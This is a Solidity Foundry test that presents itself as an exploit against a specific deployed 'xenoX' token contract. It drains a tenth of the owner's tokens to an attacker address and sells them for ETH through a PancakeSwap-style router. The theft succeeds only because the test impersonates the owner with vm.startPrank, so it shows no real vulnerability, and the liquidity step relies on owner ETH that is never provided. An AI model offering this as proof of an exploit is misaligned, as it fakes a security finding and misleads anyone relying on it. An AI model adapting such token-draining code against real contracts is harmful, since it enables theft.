contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    IxenoX token;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IxenoX(TARGET);

        // Get owner address
        address owner = token.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "xenoX Token");

        // Give attacker some ETH to start
        attacker = address(this);
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract instance and owner
        IxenoX token = IxenoX(TARGET);
        address owner = token.owner();

        console.log("Owner:", owner);
        console.log("Attacker initial ETH balance:", address(attacker).balance);

        // Step 2: Check owner token balance
        uint256 ownerBalance = token.balanceOf(owner);
        console.log("Owner token balance:", ownerBalance);

        // Step 3: Impersonate owner and transfer tokens to attacker
        vm.startPrank(owner);

        // Transfer a large amount of tokens to attacker (10% of owner's balance)
        uint256 transferAmount = ownerBalance / 10;
        console.log("Transferring tokens:", transferAmount);

        // Use regular transfer function (owner can bypass maxTxAmount)
        token.transfer(attacker, transferAmount);

        vm.stopPrank();

        // Step 4: Check attacker token balance
        uint256 attackerTokenBalance = token.balanceOf(attacker);
        console.log("Attacker token balance after transfer:", attackerTokenBalance);

        // Step 5: We need to ensure there's liquidity to sell
        // Check if pair has tokens
        address pair = token.pancakePair();
        uint256 pairTokenBalance = token.balanceOf(pair);
        console.log("Pair token balance:", pairTokenBalance);

        // If pair has no tokens, we need to add some liquidity
        // First, get some WETH to add liquidity
        IPancakeRouter02 router = IPancakeRouter02(token.pancakeRouter());
        address weth = router.WETH();

        if (pairTokenBalance == 0) {
            console.log("Adding initial liquidity...");

            // Impersonate owner again to add liquidity
            vm.startPrank(owner);

            // Approve router to spend owner's tokens
            token.approve(address(router), ownerBalance);

            // Add liquidity: owner provides both tokens and ETH
            // We'll add 1 ETH worth of liquidity
            uint256 liquidityTokens = 1000000 * 10 ** 9; // 1M tokens

            router.addLiquidityETH{value: 1 ether}(
                TARGET,
                liquidityTokens,
                0, // slippage tolerance
                0, // slippage tolerance  
                owner, // LP tokens to owner
                block.timestamp
            );

            vm.stopPrank();
        }

        // Step 6: Now sell attacker's tokens for ETH
        if (attackerTokenBalance > 0) {
            console.log("Selling tokens for ETH...");

            // Approve router to spend attacker's tokens
            token.approve(address(router), attackerTokenBalance);

            // Swap tokens for ETH
            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = weth;

            uint256 initialEth = address(attacker).balance;

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                attackerTokenBalance,
                0, // accept any amount
                path,
                attacker,
                block.timestamp
            );

            uint256 finalEth = address(attacker).balance;
            console.log("ETH gained:", finalEth - initialEth);
        }

        console.log("Final attacker ETH balance:", address(attacker).balance);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

